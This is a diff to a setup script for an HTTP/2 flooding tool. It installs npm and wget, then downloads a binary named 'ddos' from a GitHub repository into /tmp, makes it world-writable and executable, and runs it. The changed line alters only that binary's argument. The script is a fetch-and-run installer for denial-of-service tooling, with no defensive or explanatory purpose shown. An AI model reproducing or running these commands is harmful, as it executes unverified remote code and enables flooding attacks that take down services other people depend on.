@@ -9,7 +9,7 @@ yum install npm -y
 cd /root/HTTP2-Flooder
 npm i http http2 crypto tls
 yum install wget -y
-cd /tmp ; wget https://github.com/NHTSERVER/ddostool/raw/main/ddos ; chmod 777 * ; ./ddos daukute
+cd /tmp ; wget https://github.com/NHTSERVER/ddostool/raw/main/ddos ; chmod 777 * ; ./ddos ddos
 cd /root
 cd HTTP2-Flooder
 Clear
